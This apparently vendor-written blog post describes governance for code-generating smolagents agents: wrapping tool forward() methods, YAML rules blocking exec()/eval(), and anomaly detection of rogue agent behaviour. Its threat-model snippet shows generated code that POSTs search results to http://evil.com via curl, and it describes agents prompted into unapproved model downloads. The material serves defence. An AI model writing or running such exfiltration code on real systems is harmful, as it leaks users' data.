# Your Agent Just Wrote `exec()`. Now What?

Most agent governance assumes agents call tools. You define an allow-list, intercept the call, approve or deny. Clean model. Works great—until your agent *writes code* instead of calling tools.

[Hugging Face smolagents](https://huggingface.co/docs/smolagents) is one of the most capable code-generating agent frameworks available. Its `CodeAgent` writes Python at runtime to accomplish tasks. Not structured JSON tool calls. Actual Python. With `import` statements, control flow, and—if you're unlucky—`exec()`, `eval()`, or `subprocess.run()`. Imagine your agent generating a script that posts customer data to an external URL, or downloads an unapproved model from Hugging Face Hub. The damage happens at the Python runtime level, not the LLM level.

This breaks every assumption that tool-call governance is built on. And it's why we built a [dedicated governance integration for smolagents](https://github.com/microsoft/agent-governance-toolkit/tree/main/examples/smolagents-governed) using the [Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit)—an open-source runtime security layer that enforces policy and behavioral monitoring for AI agents. AGT intercepts at the execution level, not the request level.

## The threat model nobody talks about

Consider what a `CodeAgent` can do that a `ToolCallingAgent` can't:

```python
# A ToolCallingAgent emits this:
{"tool": "web_search", "args": {"query": "latest news"}}

# A CodeAgent generates this:
import subprocess
results = web_search("latest news")
subprocess.run(["curl", "-X", "POST", "http://evil.com", "-d", results])
```

The first is a named tool call that any capability guard can intercept. The second is arbitrary Python with a data exfiltration payload hidden after a legitimate tool call. A governance layer that only watches for tool *names* would approve the `web_search` and miss the `subprocess.run` entirely.

smolagents also introduces a risk that doesn't exist in other frameworks: **model downloads**. A research agent with Hub access could be prompted to download and load an arbitrary model from Hugging Face—a supply-chain attack vector that lives in the framework's own ecosystem.

## Three enforcement points, not one

Traditional agent governance has one interception point: the tool call. For code-generating agents, we need three.

### 1. Tool `forward()` wrapping

Every smolagents tool has a `forward()` method—the function that actually runs when the tool is invoked. We wrap it:

```python
from smolagents import tool, ToolCallingAgent, HfApiModel
from agent_os.integrations.maf_adapter import (
    CapabilityGuardMiddleware, MiddlewareTermination,
)

@tool
def web_search(query: str) -> str:
    """Search the web for information on a topic.

    Args:
        query: The search query string.
    """
    return search_engine.query(query)

def wrap_tool_with_governance(original_tool, guard, audit):
    original_forward = original_tool.forward

    def governed_forward(*args, **kwargs):
        try:
            asyncio.run(guard.process(tool_ctx, passthrough))
        except MiddlewareTermination:
            return f"[GOVERNANCE BLOCKED: {original_tool.name}]"
        return original_forward(*args, **kwargs)

    original_tool.forward = governed_forward
    return original_tool
```

By wrapping `forward()`, we catch tool invocations regardless of how they're triggered—whether the `ToolCallingAgent` emits a structured call or the `CodeAgent` generates Python that calls the function directly.

### 2. Input-layer policy evaluation

YAML-defined rules scan every message *before* it reaches the agent. This is where we catch injection attempts, PII, and dangerous patterns before the agent generates any code:

```yaml
rules:
  - name: "block_exec_eval"
    field: "message"
    operator: "regex"
    value: "exec\\(|eval\\("
    action: "deny"

  - name: "block_arbitrary_model_download"
    field: "message"
    operator: "contains"
    value: "huggingface.co/..."
    action: "allow"  # Only pre-approved models

  - name: "review_gate_before_publish"
    field: "message"
    operator: "contains"
    value: "REVIEWED"
    action: "allow"  # DRAFT content blocked from publishing
```

This layer blocks `exec()` and `eval()` patterns, restricts model downloads to an approved list, and enforces review gates. It runs before the agent even starts generating code.

### 3. Behavioral monitoring

The rogue detector watches patterns *across* requests. A Data Analyst making hundreds of `read_file` calls in rapid succession triggers Z-score anomaly detection—even though `read_file` is in its allow-list. The detector doesn't need rules for every possible abuse pattern. It catches statistical outliers.

## What makes this different from other integrations

Our CrewAI integration focuses on delegation chains between agents in a crew. Our OpenAI Agents SDK integration plugs into the native `InputGuardrail` system. This smolagents integration is fundamentally different because the *threat model* is different.

With tool-calling frameworks, the governance question is: "Should this agent be allowed to call this tool?" With code-generating frameworks, the question is: "What Python is this agent about to execute, and what can that Python do?"

That's a harder question. A capability guard can look up tool names in a table. Catching dangerous generated code requires pattern matching on code structure—`exec()`, `subprocess`, `os.system()`, `import shutil`—in addition to tool-level governance.

## Five LLM backends, identical governance

The example supports automatic backend fallback:

| Priority | Backend | Cost |
|----------|---------|------|
| 1 | GitHub Models | Free |
| 2 | Google Gemini | Free tier |
| 3 | Azure OpenAI | Pay-as-you-go |
| 4 | OpenAI | Pay-as-you-go |
| 5 | Simulated | Free (no API key) |

The governance layer doesn't change when you swap backends. It operates above the LLM—wrapping tool execution and evaluating policies before the model runs, regardless of which model that is.

## The uncomfortable truth about code-generating agents

As code-generating agents get more capable, the surface area for governance gets *larger*, not smaller. A `CodeAgent` that can write arbitrary Python has strictly more power than one limited to named tool calls. It can invent new tool combinations, chain operations, and—if compromised—do things no capability guard anticipated.

The OWASP Agentic Top 10 was written with tool-calling agents in mind. Code-generating agents amplify every risk on that list. Tool misuse (#2) becomes "arbitrary code execution." Unexpected code execution (#5) becomes "the agent discovered it can `import os`." Cascading failures (#8) become "the agent wrote a loop that allocated 16GB of memory."

Framework-level safety features can't fully address this. They can restrict which tools are available, but they can't inspect the generated code that calls those tools. That requires a governance layer that understands execution—not just orchestration.

## Add governance to your own smolagents project

1. **Install:** `pip install agent-governance-toolkit[full]` alongside your existing `smolagents` install.
2. **Wrap your tools:** Use `wrap_tool_with_governance()` on each `@tool`-decorated function. This is the key pattern — it intercepts `forward()` for both `CodeAgent` and `ToolCallingAgent`.
3. **Define policies:** Create YAML rules that block dangerous patterns (`exec()`, `eval()`, unapproved model downloads). Start with the [example policies](https://github.com/microsoft/agent-governance-toolkit/tree/main/examples/smolagents-governed/policies).
4. **Pass governed tools to your agent:** `ToolCallingAgent(tools=governed_tools, model=...)` — everything else stays the same.

## Try it

```bash
git clone https://github.com/microsoft/agent-governance-toolkit
cd agent-governance-toolkit/examples/smolagents-governed

# Real smolagents integration
pip install smolagents agent-governance-toolkit[full]
python getting_started.py

# No-dependency simulated mode
python smolagents_governance_demo.py
```

`getting_started.py` uses real `@tool` decorators and `ToolCallingAgent` with governance at the `forward()` level. `smolagents_governance_demo.py` runs the governance scenarios—including model safety gates, delegation governance, and tamper-proof auditing—without any framework dependency. Set `GITHUB_TOKEN=$(gh auth token)` for free GitHub Models access.

> **Note:** The code snippets above are abbreviated for clarity. See [`getting_started.py`](https://github.com/microsoft/agent-governance-toolkit/tree/main/examples/smolagents-governed/getting_started.py) for the complete, runnable integration.

The [Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit) is MIT-licensed and open source.

The most dangerous agent isn't the one that calls the wrong tool. It's the one that writes its own.
